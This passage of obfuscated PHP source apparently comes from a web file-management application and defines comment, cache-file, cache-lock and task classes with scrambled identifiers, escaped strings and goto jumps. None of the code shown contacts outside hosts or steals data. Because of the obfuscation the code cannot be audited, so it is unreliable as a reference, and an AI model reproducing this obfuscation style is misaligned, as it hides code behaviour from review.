Task::get($´ßÎË£Í[865]), $´ßÎË£Í[845] => Task::get($´ßÎË£Í[883]), $´ßÎË£Í[230] => Task::get($´ßÎË£Í[892])); $´ç¤¼¿À = !1; foreach ($›è×“‚Ï as &$©ş°¯Îú) { if ($´ç¤¼¿À) { $©ş°¯Îú = !1; continue; } if ($©ş°¯Îú) { $€êÕÙ³ = intval(_get($©ş°¯Îú, $´ßÎË£Í[1786], 0)); if (time() - $€êÕÙ³ > 7200) { Task::kill($©ş°¯Îú[$´ßÎË£Í[475]]); $´ç¤¼¿À = !0; $©ş°¯Îú = !1; } } } return $›è×“‚Ï; } public function restore() { $‚ñˆÍ‰È =& $_SERVER[Ùæõ‰Ï’]; ActionCall($‚ñˆÍ‰È[1151], !0, 1); ActionCall($‚ñˆÍ‰È[1151], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\145\x6e\x74"; protected $tableMeta = array("\164\141\142\x6c\x65\x4e\x61\155\145" => "\x63\x6f\x6d\155\x65\156\x74\x5f\x6d\145\164\141", "\x6d\x65\164\x61\106\x69\x65\154\144" => "\143\x6f\x6d\x6d\x65\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¸¢äİáí) { $¿Ê±¦È =& $_SERVER[Ùæõ‰Ï’]; if ($¸¢äİáí[$¿Ê±¦È[2008]]) { $ç˜¯®Îš = $this->where(array($¿Ê±¦È[2009] => $¸¢äİáí[$¿Ê±¦È[2008]]))->find(); if (!$ç˜¯®Îš || $ç˜¯®Îš[$¿Ê±¦È[190]] != $¸¢äİáí[$¿Ê±¦È[190]] || $ç˜¯®Îš[$¿Ê±¦È[569]] != $¸¢äİáí[$¿Ê±¦È[569]]) { return !1; } $this->where(array($¿Ê±¦È[2009] => $¸¢äİáí[$¿Ê±¦È[2008]]))->setAdd($¿Ê±¦È[2010], 1); } $¸¢äİáí[$¿Ê±¦È[2011]] = 0; $¸¢äİáí[$¿Ê±¦È[2010]] = 0; $¸¢äİáí[$¿Ê±¦È[833]] = 1; return $this->add($¸¢äİáí); } public function commentCount($Õ¿‚÷«³, $ŞÚ¿¿Ó¶, $‡âÅ÷– = false) { $Í’çøÊ =& $_SERVER[Ùæõ‰Ï’]; if (!$Õ¿‚÷«³) { return array(); } if (is_string($Õ¿‚÷«³) || is_int($Õ¿‚÷«³)) { $Õ¿‚÷«³ = array($Õ¿‚÷«³); } $ÙèãƒÚó = array($Í’çøÊ[569], $Í’çøÊ[2012] => $Í’çøÊ[565]); $Ë®“óâ = array($Í’çøÊ[569] => array($Í’çøÊ[7], $Õ¿‚÷«³), $Í’çøÊ[190] => $ŞÚ¿¿Ó¶); if ($‡âÅ÷–) { $Ë®“óâ[$Í’çøÊ[1781]] = $‡âÅ÷–; } $œê÷†úÚ = $this->field($ÙèãƒÚó)->where($Ë®“óâ)->group($Í’çøÊ[569])->select(); return array_to_keyvalue($œê÷†úÚ, $Í’çøÊ[569], $Í’çøÊ[565]); } public function starTarget($ÍÛ¹í…, $ìÉ¸‘ñ) { $ŸŒœÙÁ =& $_SERVER[Ùæõ‰Ï’]; $æ–ÆŒ· = $ÍÛ¹í… + self::TYPE_STAR_OFFSET; $Àñ«½ı” = array($ŸŒœÙÁ[1781] => USER_ID, $ŸŒœÙÁ[190] => $æ–ÆŒ·, $ŸŒœÙÁ[569] => $ìÉ¸‘ñ); $ƒø¿äº = $this->where($Àñ«½ı”)->find(); if ($ƒø¿äº) { return $this->where(array($ŸŒœÙÁ[475] => $ƒø¿äº[$ŸŒœÙÁ[475]]))->delete(); } $·•î¾Õ… = array($ŸŒœÙÁ[2008] => 0, $ŸŒœÙÁ[1781] => USER_ID, $ŸŒœÙÁ[833] => 1, $ŸŒœÙÁ[171] => $ŸŒœÙÁ[12], $ŸŒœÙÁ[190] => $æ–ÆŒ·, $ŸŒœÙÁ[569] => $ìÉ¸‘ñ, $ŸŒœÙÁ[2011] => 0, $ŸŒœÙÁ[2010] => 0); return $this->add($·•î¾Õ…); } public function starTargetCount($Áß£êõµ, $ïŒÆƒ‰») { $Ó“óÑƒ =& $_SERVER[Ùæõ‰Ï’]; $êÛÀİÉÄ = $ïŒÆƒ‰» + self::TYPE_STAR_OFFSET; $ıÏ¢ñ›¦ = $this->commentCount($Áß£êõµ, $êÛÀİÉÄ); $†½ØšÓ = $this->commentCount($Áß£êõµ, $êÛÀİÉÄ, USER_ID); return array($Ó“óÑƒ[2013] => $ıÏ¢ñ›¦, $Ó“óÑƒ[2014] => $†½ØšÓ); } public function starTargetUserList($©õñœß², $ñ¼‡×øº) { $£ºÔ‚úÇ =& $_SERVER[Ùæõ‰Ï’]; $Úöìêçƒ = $©õñœß² + self::TYPE_STAR_OFFSET; $ßãëˆœ“ = array($£ºÔ‚úÇ[569] => $ñ¼‡×øº, $£ºÔ‚úÇ[190] => $Úöìêçƒ); $î¼”äİÖ = $this->where($ßãëˆœ“)->count(); $ŒÛüüù = array($£ºÔ‚úÇ[332] => $î¼”äİÖ, $£ºÔ‚úÇ[2015] => array()); if (!$î¼”äİÖ) { return $ŒÛüüù; } $Ê­áµˆ¸ = $this->field($£ºÔ‚úÇ[1781])->where($ßãëˆœ“)->limit(500)->select(); $Ê­áµˆ¸ = array_to_keyvalue($Ê­áµˆ¸, $£ºÔ‚úÇ[12], $£ºÔ‚úÇ[1781]); $ŒÛüüù[$£ºÔ‚úÇ[2015]] = Model($£ºÔ‚úÇ[577])->userListInfo($Ê­áµˆ¸); return $ŒÛüüù; } public function prasiseUserList($²Ü¯ï„’) { $ÊŞÒÁ¸Ç =& $_SERVER[Ùæõ‰Ï’]; $Éş¹öÛÛ = array($ÊŞÒÁ¸Ç[2016] => $²Ü¯ï„’); $ã®ş÷öÀ = $this->where($Éş¹öÛÛ)->find(); $¢ì×ù´½ = _get($ã®ş÷öÀ, $ÊŞÒÁ¸Ç[2011], 0); $–‡†’œÛ = array($ÊŞÒÁ¸Ç[332] => $¢ì×ù´½, $ÊŞÒÁ¸Ç[2015] => array()); if (!$¢ì×ù´½) { return $–‡†’œÛ; } $ÀÌ¸ŸÜ· = Model($ÊŞÒÁ¸Ç[2017])->field($ÊŞÒÁ¸Ç[1781])->where($Éş¹öÛÛ)->limit(500)->select(); $ÀÌ¸ŸÜ· = array_to_keyvalue($ÀÌ¸ŸÜ·, $ÊŞÒÁ¸Ç[12], $ÊŞÒÁ¸Ç[1781]); $–‡†’œÛ[$ÊŞÒÁ¸Ç[2015]] = Model($ÊŞÒÁ¸Ç[577])->userListInfo($ÀÌ¸ŸÜ·); return $–‡†’œÛ; } public function remove($¬Ä‰ë‚) { $Ñ¼Êæé· =& $_SERVER[Ùæõ‰Ï’]; $ãà¶å‰¾ = array($Ñ¼Êæé·[2009] => $¬Ä‰ë‚); $’ÊŸş = $this->where($ãà¶å‰¾)->find(); if ($’ÊŸş[$Ñ¼Êæé·[2008]]) { $this->where(array($Ñ¼Êæé·[2009] => $’ÊŸş[$Ñ¼Êæé·[2008]]))->setAdd($Ñ¼Êæé·[2010], -1); } return $this->where($ãà¶å‰¾)->delete(); } public function edit($œ·ˆŸÍ¿, $å“ÄõÇ) { $ˆ¶ŠÁË =& $_SERVER[Ùæõ‰Ï’]; $°·¤§úŞ = array($ˆ¶ŠÁË[2009] => $œ·ˆŸÍ¿); return $this->where($°·¤§úŞ)->save(array($ˆ¶ŠÁË[2018] => $å“ÄõÇ)); } public function prasise($İÒÓš‡§) { $úÊúÀ”ù =& $_SERVER[Ùæõ‰Ï’]; $Ò§è†ŞŠ = Model($úÊúÀ”ù[2019]); $ÖÉà·úå = array($úÊúÀ”ù[2009] => $İÒÓš‡§, $úÊúÀ”ù[1772] => USER_ID); $›ß“ü¯º = $Ò§è†ŞŠ->where($ÖÉà·úå)->find(); if (!$›ß“ü¯º) { $Ò§è†ŞŠ->add($ÖÉà·úå); $«ĞÂ­‰ğ = $this->where(array($úÊúÀ”ù[2009] => $İÒÓš‡§))->setAdd($úÊúÀ”ù[2011], 1); } else { $Ò§è†ŞŠ->where($ÖÉà·úå)->delete(); $«ĞÂ­‰ğ = $this->where(array($úÊúÀ”ù[2009] => $İÒÓš‡§))->setAdd($úÊúÀ”ù[2011], -1); } return $«ĞÂ­‰ğ; } public function targetInfo($ÇÃçĞ¼­, $’½‘°¢ˆ) { $¬¼€Û =& $_SERVER[Ùæõ‰Ï’]; $øöãÛƒÎ = array($¬¼€Û[648] => $ÇÃçĞ¼­, $¬¼€Û[649] => $’½‘°¢ˆ); $Õó¿ÊôÎ = $this->where($øöãÛƒÎ)->count(); $ÑµÁìà´ = "\x52\111\107\x48\124\x20\112\117\111\116\40{$this->tablePrefix}\143\157\155\x6d\x65\x6e\164\x5f\x70\162\x61\x69\163\x65\40\x73\x74\141\x72\40\x6f\x6e\40\x63\157\x6d\x6d\x65\156\164\x2e\x63\157\x6d\x6d\x65\156\x74\x49\x44\x20\75\40\163\164\141\162\x2e\x63\157\155\x6d\x65\x6e\164\x49\104"; $ì‰ÆÒÔÆ = $this->alias($¬¼€Û[430])->where($øöãÛƒÎ)->join($ÑµÁìà´, $¬¼€Û[2020])->count(); $˜ğæßúÕ = array($¬¼€Û[2021] => $Õó¿ÊôÎ, $¬¼€Û[2022] => $ì‰ÆÒÔÆ); return $˜ğæßúÕ; } public function listData($½çØ²üÎ) { $ßŒõÆş‡ =& $_SERVER[Ùæõ‰Ï’]; if (isset($½çØ²üÎ[$ßŒõÆş‡[2023]])) { if ($½çØ²üÎ[$ßŒõÆş‡[2023]]) { $½çØ²üÎ[$ßŒõÆş‡[2016]] = array($ßŒõÆş‡[1105], intval($½çØ²üÎ[$ßŒõÆş‡[2023]])); } unset($½çØ²üÎ[$ßŒõÆş‡[2023]]); } if (isset($½çØ²üÎ[$ßŒõÆş‡[2024]])) { if ($½çØ²üÎ[$ßŒõÆş‡[2024]]) { $½çØ²üÎ[$ßŒõÆş‡[2016]] = array($ßŒõÆş‡[1102], intval($½çØ²üÎ[$ßŒõÆş‡[2024]])); } unset($½çØ²üÎ[$ßŒõÆş‡[2024]]); } return $this->_listData($½çØ²üÎ); } private function _listData($×˜¾©ï) { $ÚÑ«â‘® =& $_SERVER[Ùæõ‰Ï’]; $Ù–¢š´ = $this->where($×˜¾©ï)->_makeOrder()->selectPage(100); $this->_listAppendParent($Ù–¢š´[$ÚÑ«â‘®[445]]); $this->_listAppendUser($Ù–¢š´[$ÚÑ«â‘®[445]]); $this->_listAppendMeta($Ù–¢š´[$ÚÑ«â‘®[445]]); return $Ù–¢š´; } private function _makeOrder() { $ú³áå¥ô =& $_SERVER[Ùæõ‰Ï’]; $÷ùÅìßˆ = array($ú³áå¥ô[2011], $ú³áå¥ô[2010], $ú³áå¥ô[231]); $˜ÃÖÇÒŒ = Input::get($ú³áå¥ô[530], $ú³áå¥ô[7], $ú³áå¥ô[497], $÷ùÅìßˆ); $ÓÍ¿ñä = Input::get($ú³áå¥ô[531], $ú³áå¥ô[7], $ú³áå¥ô[1774], array($ú³áå¥ô[2025], $ú³áå¥ô[526])); $¸ÚèÃƒ = $˜ÃÖÇÒŒ . $ú³áå¥ô[53] . $ÓÍ¿ñä; return $this->order($¸ÚèÃƒ); } private function _listAppendParent(&$À–‹ëñğ) { $‘šëĞÔ =& $_SERVER[Ùæõ‰Ï’]; $¼µª¡¸Ã = array_unique(array_to_keyvalue($À–‹ëñğ, $‘šëĞÔ[12], $‘šëĞÔ[2008])); $¼µª¡¸Ã = array_remove_value($¼µª¡¸Ã, $‘šëĞÔ[228]); if (!$¼µª¡¸Ã) { return; } $ğ §Ä³ö = $this->where(array($‘šëĞÔ[2009] => array($‘šëĞÔ[7], $¼µª¡¸Ã)))->select(); $ğ §Ä³ö = array_to_keyvalue($ğ §Ä³ö, $‘šëĞÔ[2016]); foreach ($À–‹ëñğ as &$ù»»¡¨) { if (isset($ğ §Ä³ö[$ù»»¡¨[$‘šëĞÔ[2008]]])) { $ù»»¡¨[$‘šëĞÔ[2026]] = $ğ §Ä³ö[$ù»»¡¨[$‘šëĞÔ[2008]]]; } } unset($ù»»¡¨); } private function _listAppendUser(&$©¦³Äúô) { $£òÇ =& $_SERVER[Ùæõ‰Ï’]; $¾åÉƒŸ = array_unique(array_to_keyvalue($©¦³Äúô, $£òÇ[12], $£òÇ[1781])); $¾åÉƒŸ = array_remove_value($¾åÉƒŸ, $£òÇ[228]); if (count($¾åÉƒŸ) == 0) { return; } foreach ($©¦³Äúô as $÷¢ãÇÕ) { if (isset($÷¢ãÇÕ[$£òÇ[2026]])) { $¾åÉƒŸ[] = $÷¢ãÇÕ[$£òÇ[2026]][$£òÇ[1781]]; } } $Î——Ÿš = Model($£òÇ[598])->userListInfo($¾åÉƒŸ); foreach ($©¦³Äúô as &$÷¢ãÇÕ) { $÷¢ãÇÕ[$£òÇ[662]] = $Î——Ÿš[$÷¢ãÇÕ[$£òÇ[1781]]]; if (isset($÷¢ãÇÕ[$£òÇ[2026]])) { $÷¢ãÇÕ[$£òÇ[2026]][$£òÇ[662]] = $Î——Ÿš[$÷¢ãÇÕ[$£òÇ[2026]][$£òÇ[1781]]]; } } unset($÷¢ãÇÕ); } private function _listAppendMeta(&$ø‡²êÂ) { $¢È˜ÎÆ¦ =& $_SERVER[Ùæõ‰Ï’]; $«éõ¤é = array_unique(array_to_keyvalue($ø‡²êÂ, $¢È˜ÎÆ¦[12], $¢È˜ÎÆ¦[2016])); $«éõ¤é = array_remove_value($«éõ¤é, $¢È˜ÎÆ¦[228]); if (!$«éõ¤é) { return; } foreach ($ø‡²êÂ as $åè†¸ˆ) { if (isset($åè†¸ˆ[$¢È˜ÎÆ¦[2026]])) { $«éõ¤é[] = $åè†¸ˆ[$¢È˜ÎÆ¦[2026]][$¢È˜ÎÆ¦[2016]]; } } $ÇıÍı = $this->metaList($«éõ¤é); if (!$ÇıÍı) { return !1; } foreach ($ø‡²êÂ as &$åè†¸ˆ) { $åè†¸ˆ[$¢È˜ÎÆ¦[539]] = $ÇıÍı[$åè†¸ˆ[$¢È˜ÎÆ¦[2016]]]; if (isset($åè†¸ˆ[$¢È˜ÎÆ¦[2026]])) { $åè†¸ˆ[$¢È˜ÎÆ¦[2026]][$¢È˜ÎÆ¦[539]] = $ÇıÍı[$åè†¸ˆ[$¢È˜ÎÆ¦[2026]][$¢È˜ÎÆ¦[2016]]]; } } unset($åè†¸ˆ); } private function metaList($¹ƒãç¤î) { $­‡çêŸ =& $_SERVER[Ùæõ‰Ï’]; if (!$¹ƒãç¤î) { return array(); } $®Ùğ…Í„ = array($­‡çêŸ[2016] => array($­‡çêŸ[7], $¹ƒãç¤î)); $–è€åóÛ = Model($­‡çêŸ[2027])->where($®Ùğ…Í„)->select(); $–è€åóÛ = array_to_keyvalue_group($–è€åóÛ, $­‡çêŸ[2016]); foreach ($–è€åóÛ as $×ñ…Óñ£ => $ùëºİŠ) { $£¶€Û€á = array(); foreach ($ùëºİŠ as $í¢¯‘ÛÎ) { $£¶€Û€á[$í¢¯‘ÛÎ[$­‡çêŸ[97]]] = $í¢¯‘ÛÎ[$­‡çêŸ[450]]; } $–è€åóÛ[$×ñ…Óñ£] = $£¶€Û€á; } return $–è€åóÛ ? $–è€åóÛ : array(); } public function removeTarget($àÛè¯¬­, $ÑƒÕûÆ›) { $õåöÜ“ =& $_SERVER[Ùæõ‰Ï’]; if (!$ÑƒÕûÆ›) { return !0; } $ÑƒÕûÆ› = is_array($ÑƒÕûÆ›) ? $ÑƒÕûÆ› : array($ÑƒÕûÆ›); $œé­İà¢ = array($õåöÜ“[190] => $àÛè¯¬­, $õåöÜ“[569] => array($õåöÜ“[7], $ÑƒÕûÆ›)); $¨·Õ£ = $this->field($õåöÜ“[2016])->where($œé­İà¢)->select(); $ÍŒú†Á‘ = array_to_keyvalue($¨·Õ£, $õåöÜ“[12], $õåöÜ“[2016]); if (!$ÍŒú†Á‘) { return !0; } $œé­İà¢ = array($õåöÜ“[2016] => array($õåöÜ“[7], $ÍŒú†Á‘)); $this->where($œé­İà¢)->delete(); Model($õåöÜ“[2019])->where($œé­İà¢)->delete(); Model($õåöÜ“[2028])->where($œé­İà¢)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\x66\151\154\x65\x5f\143\x6f\156\x74\145\x6e\x74\x73"; protected $dataAuto = array(array("\x63\162\x65\141\x74\x65\124\x69\155\x65", "\x74\x69\155\145", "\151\156\163\145\x72\x74", "\146\x75\156\x63\x74\151\157\x6e")); } goto bÊŞ©×»ôª; CÕ±ÛÂå†: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Ó»¥·Œ, $âıÃ¹ûâ) { $˜Š­åÃ =& $_SERVER[Ùæõ‰Ï’]; $this->cachePath = $Ó»¥·Œ[$˜Š­åÃ[87]]; $this->prefix = $˜Š­åÃ[917]; $this->cacheTime = $âıÃ¹ûâ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($¶ˆ‰¤¢‘) { $à¼úâ¼¥ =& $_SERVER[Ùæõ‰Ï’]; $¶ˆ‰¤¢‘ = str_replace(array($à¼úâ¼¥[918], $à¼úâ¼¥[100], $à¼úâ¼¥[76]), $à¼úâ¼¥[919], $¶ˆ‰¤¢‘); return $this->cachePath . $à¼úâ¼¥[920] . $¶ˆ‰¤¢‘ . $à¼úâ¼¥[921]; } public function set($¹‹¬Í–£, $áØ§áç¾, $ë¹Ä–¤À = false) { $ë¹Ä–¤À = $ë¹Ä–¤À ? $ë¹Ä–¤À : $this->cacheTime; $¦ˆ¿Æ‡Ğ = $this->getFile($¹‹¬Í–£); if (file_put_contents($¦ˆ¿Æ‡Ğ, $this->prefix . $áØ§áç¾, LOCK_EX)) { @touch($¦ˆ¿Æ‡Ğ, intval(time() + $ë¹Ä–¤À)); clearstatcache(); return !0; } @unlink($¦ˆ¿Æ‡Ğ); return !1; } public function get($³ÓÔè ) { $¼Ô‹ÛŸê = $this->getFile($³ÓÔè ); if (file_exists($¼Ô‹ÛŸê) && filemtime($¼Ô‹ÛŸê) < time()) { @unlink($¼Ô‹ÛŸê); return !1; } $—Ô±à³ = @file_get_contents($¼Ô‹ÛŸê); return substr($—Ô±à³, strlen($this->prefix)); } public function remove($í·‘¤‰´) { $Ğº‚½€€ = $this->getFile($í·‘¤‰´); return @unlink($Ğº‚½€€); } public function deleteAll() { $Å®–Áş =& $_SERVER[Ùæõ‰Ï’]; $òÛ£•˜Ô = scandir($this->cachePath); foreach ($òÛ£•˜Ô as $‹¼ÅôîÂ) { $éÔŒò¿ = $this->cachePath . $‹¼ÅôîÂ; if (strpos($éÔŒò¿, $Å®–Áş[921]) && strpos($éÔŒò¿, $Å®–Áş[922])) { @unlink($éÔŒò¿); } } } public function clearTimeout() { $ùÚş¬•æ =& $_SERVER[Ùæõ‰Ï’]; $áÏÌŞœ = scandir($this->cachePath); foreach ($áÏÌŞœ as $ñç›éëÆ) { $ÀÙàö±´ = $this->cachePath . $ñç›éëÆ; if (strpos($ÀÙàö±´, $ùÚş¬•æ[921]) && strpos($ÀÙàö±´, $ùÚş¬•æ[922]) && filemtime($ÀÙàö±´) < time()) { @unlink($ÀÙàö±´); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Íò®¡ãË =& $_SERVER[Ùæõ‰Ï’]; if (self::$handle) { return self::$handle; } $ÓˆîË» = $GLOBALS[$Íò®¡ãË[6]][$Íò®¡ãË[425]]; self::$timeout = $ÓˆîË»[$Íò®¡ãË[923]] ? $ÓˆîË»[$Íò®¡ãË[923]] : 10; $——Û¶Ä÷ = _get($GLOBALS[$Íò®¡ãË[6]], $Íò®¡ãË[924]); $«Œˆ­Êô = $ÓˆîË»[$Íò®¡ãË[909]] ? $ÓˆîË»[$Íò®¡ãË[909]] : $Íò®¡ãË[230]; if ($«Œˆ­Êô == $Íò®¡ãË[21] && $——Û¶Ä÷ == $Íò®¡ãË[13]) { $«Œˆ­Êô = $Íò®¡ãË[230]; } switch ($«Œˆ­Êô) { case $Íò®¡ãË[912]: self::$handle = new CacheLockRedis(); break; case $Íò®¡ãË[913]: self::$handle = new CacheLockMemcached(); break; case $Íò®¡ãË[21]: self::$handle = new CacheLockDatabase(); break; case $Íò®¡ãË[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Íò®¡ãË[925], $Íò®¡ãË[926]); } return self::$handle; } private static function key($šôú…›ó) { return $_SERVER[Ùæõ‰Ï’][927] . Cache::key($šôú…›ó); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¯ëŞÉ¾˜ = '') { self::$errorMsg = $¯ëŞÉ¾˜; } public static function lockGlobal($€í€üû, $Ûäø®ı•) { return self::lock($€í€üû, $Ûäø®ı•, !0); } public static function lock($È¬×œ³‡, $Äé–’ª = false, $äå×Ü…ç = false) { $ä¢¥‹¥ =& $_SERVER[Ùæõ‰Ï’]; $ÇÃÁ–Ù = self::init(); $°¸êğí = self::key($È¬×œ³‡); $Äé–’ª = $Äé–’ª ? $Äé–’ª : self::$timeout; $Ìøã±ç– = timeFloat(); $•®âô—× = $ÇÃÁ–Ù->lock($°¸êğí, $Äé–’ª); $½¹šŸâ = timeFloat(); if (!$•®âô—×) { $”Ê¶Ç™ = "\x6c\x6f\x63\153\x20\x65\162\x72\157\x72\73\153\x65\x79\75{$È¬×œ³‡}\73\164\151\x6d\145\75{$Äé–’ª}\73" . self::$errorMsg . $ä¢¥‹¥[74] . get_caller_msg(); $ñÎĞ¾ñË = LNG($ä¢¥‹¥[928]) . "\50{$Äé–’ª}\x73\51\x2e" . LNG($ä¢¥‹¥[929]); $ñÎĞ¾ñË .= $ä¢¥‹¥[930]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ñÎĞ¾ñË = $ñÎĞ¾ñË . $ä¢¥‹¥[931] . self::$errorMsg; } write_log($ä¢¥‹¥[932] . sprintf($ä¢¥‹¥[933], timeFloat() - $Ìøã±ç–) . $ä¢¥‹¥[934] . $”Ê¶Ç™ . $ä¢¥‹¥[935] . error_get_last(), $ä¢¥‹¥[926]); show_json($ñÎĞ¾ñË, !1); } if (!$äå×Ü…ç) { self::$lockItem[$°¸êğí] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ü¤ë¹ì² = number_format(timeFloat() - $½¹šŸâ, 3); write_log($ä¢¥‹¥[936] . $È¬×œ³‡ . $ä¢¥‹¥[937] . $ü¤ë¹ì², $ä¢¥‹¥[926]); } return $•®âô—×; } public static function lockGet($íÅï€öÄ) { $ô½ş°– = self::key($íÅï€öÄ); if (self::$lockItem[$ô½ş°–]) { return self::$lockItem[$ô½ş°–]; } return self::init()->lockGet($ô½ş°–); } public static function unlock($†ËÄÀÈâ) { $¸÷øŞ®© =& $_SERVER[Ùæõ‰Ï’]; $¸²‰À— = self::key($†ËÄÀÈâ); self::$lockItem[$¸²‰À—] = null; self::init()->unlock($¸²‰À—); if (GLOBAL_DEBUG_LOG_ALL) { write_log($¸÷øŞ®©[938] . $†ËÄÀÈâ, $¸÷øŞ®©[926]); } return; } public static function unlockRuntime() { $¡š‘¾ãè =& $_SERVER[Ùæõ‰Ï’]; $×€´æã = self::init(); $—ô¤±…€ = !1; foreach (self::$lockItem as $ÜøìÓùĞ => $À¬õÄ›) { if (!$À¬õÄ›) { continue; } $×€´æã->unlock($ÜøìÓùĞ); if (!$—ô¤±…€) { $—ô¤±…€ = !0; write_log($¡š‘¾ãè[939] . $ÜøìÓùĞ . $¡š‘¾ãè[74] . get_caller_msg(), $¡š‘¾ãè[926]); continue; } write_log($¡š‘¾ãè[939] . $ÜøìÓùĞ, $¡š‘¾ãè[926]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Êö—¹À€ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($¡š‘¾ãè[940] . $Êö—¹À€ . $¡š‘¾ãè[941] . ACTION, $¡š‘¾ãè[926]); } } public static function fileLock($ÊÒãéã) { $ş­Šèˆ™ =& $_SERVER[Ùæõ‰Ï’]; if (!$GLOBALS[$ş­Šèˆ™[942]]) { $GLOBALS[$ş­Šèˆ™[942]] = array(); } $GLOBALS[$ş­Šèˆ™[942]][$ÊÒãéã] = !1; $¼Ş±»á = fopen(DATA_PATH . $ÊÒãéã . $ş­Šèˆ™[943], $ş­Šèˆ™[944]); if (!$¼Ş±»á) { return !1; } $GLOBALS[$ş­Šèˆ™[942]][$ÊÒãéã] = $¼Ş±»á; if (flock($¼Ş±»á, LOCK_EX)) { return !0; } self::unlock($ÊÒãéã); show_json($ş­Šèˆ™[945], !1); return !1; } public static function fileUnlock($’‡¯ÙÌÏ) { $ó±©·â =& $_SERVER[Ùæõ‰Ï’]; $ø¿§¥Óº = $GLOBALS[$ó±©·â[942]][$’‡¯ÙÌÏ]; if (!$ø¿§¥Óº) { return; } $GLOBALS[$ó±©·â[942]][$’‡¯ÙÌÏ] = !1; flock($ø¿§¥Óº, LOCK_UN); fclose($ø¿§¥Óº); } public static function fileUnlockAll() { $å§­÷Âé =& $_SERVER[Ùæõ‰Ï’]; if (!isset($GLOBALS[$å§­÷Âé[942]]) || !$GLOBALS[$å§­÷Âé[942]]) { return; } foreach ($GLOBALS[$å§­÷Âé[942]] as $§´“î±² => $¯ÊŸ ¹‡) { if (!$¯ÊŸ ¹‡) { continue; } $GLOBALS[$å§­÷Âé[942]][$§´“î±²] = !1; flock($¯ÊŸ ¹‡, LOCK_UN); fclose($¯ÊŸ ¹‡); } $GLOBALS[$å§­÷Âé[942]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto C¢…¼Ò÷Ó; EŸîÑËø‰: function binCheckBigger($İËôòŒ‹, $‰ÈË³ÉÓ) { return $İËôòŒ‹ > $‰ÈË³ÉÓ; } $_SERVER[$_SERVER[™ÊæÄ‡Ş][3]] = ("\70\65\61\66".base64_decode('OTI='))+0;$_r2f1="h9pciztr71d3kw2bmx54vos0ajfuq8n6eygl6zi4hm5qkoea82fyuj03cwnx917sgrvlt";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($²ƒ¯, $å•íÈÔâ) { $ğ°¶ïüª =& $_SERVER[Ùæõ‰Ï’]; if (isset(self::$_methodList[$²ƒ¯])) { return @call_user_func_array(self::$_methodList[$²ƒ¯], $å•íÈÔâ); } else { if (method_exists($this, $²ƒ¯)) { return call_user_func_array(array($this, $²ƒ¯), $å•íÈÔâ); } else { think_exception(__CLASS__ . $ğ°¶ïüª[4] . $²ƒ¯ . $ğ°¶ïüª[5]); } } } public static function __callStatic($µÈÍ´üÀ, $¡¾Ô§·) { if (isset(self::$_methodListStatic[$µÈÍ´üÀ])) { return call_user_func_array(self::$_methodListStatic[$µÈÍ´üÀ], $¡¾Ô§·); } else { if (method_exists(self, $µÈÍ´üÀ)) { return call_user_func_array(array(self, $µÈÍ´üÀ), $¡¾Ô§·); } else { show_json("{$µÈÍ´üÀ}\x28\x29\x20\156\157\164\x20\145\x78\x69\163\x74\73", !1); } } } public static function addMethod($”¡Çƒ©, $¡İ¹³§°) { self::$_methodList[$”¡Çƒ©] = $¡İ¹³§°; } public static function addMethodStatic($ä…ò’»Ç, $¸Ôù˜é) { self::$_methodListStatic[$ä…ò’»Ç] = $¸Ôù˜é; } } goto e§¯èÄÊ®Ï; fôâ³ó½: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ŞÃ¾Şø÷, $¢åöÌõì = 5.0) { if (!$ŞÃ¾Şø÷) { return; } $áÓø¦”¾ = Cache::get($ŞÃ¾Şø÷); if (!$áÓø¦”¾ || timeFloat() - floatVal($áÓø¦”¾) >= $¢åöÌõì) { Cache::set($ŞÃ¾Şø÷, timeFloat(), $¢åöÌõì * 10); return !0; } return !1; } public static function timeLimitCall($âÉÆş“º, $Üæ„§ìş, $òŸ—Úí, $ÂËÔª±º = 5.0) { $Œ×œÚ¹â =& $_SERVER[Ùæõ‰Ï’]; if (!$âÉÆş“º || !$Üæ„§ìş) { return; } self::$asyncAdd = !0; $ğ¼š ì½ = $Œ×œÚ¹â[1887]; $³ô½ëÆÉ = Cache::get($ğ¼š ì½, !0); $©å˜³…ì = array($Œ×œÚ¹â[1888] => timeFloat(), $Œ×œÚ¹â[1889] => timeFloat(), $Œ×œÚ¹â[341] => $Üæ„§ìş, $Œ×œÚ¹â[1879] => $òŸ—Úí, $Œ×œÚ¹â[206] => $ÂËÔª±º); if (is_array($³ô½ëÆÉ[$âÉÆş“º])) { $©å˜³…ì[$Œ×œÚ¹â[1889]] = $³ô½ëÆÉ[$âÉÆş“º][$Œ×œÚ¹â[1889]]; } if (is_array($³ô½ëÆÉ[$âÉÆş“º])) { if (timeFloat() - $³ô½ëÆÉ[$âÉÆş“º][$Œ×œÚ¹â[1888]] < $©å˜³…ì[$Œ×œÚ¹â[206]] * 0.3) { return; } $©å˜³…ì[$Œ×œÚ¹â[1889]] = $³ô½ëÆÉ[$âÉÆş“º][$Œ×œÚ¹â[1889]]; } $³ô½ëÆÉ[$âÉÆş“º] = $©å˜³…ì; Cache::set($ğ¼š ì½, $³ô½ëÆÉ, 60); Cache::removeMemory($ğ¼š ì½); write_log($Œ×œÚ¹â[1890] . $âÉÆş“º . $Œ×œÚ¹â[74] . $Üæ„§ìş, $Œ×œÚ¹â[197]); } public static function 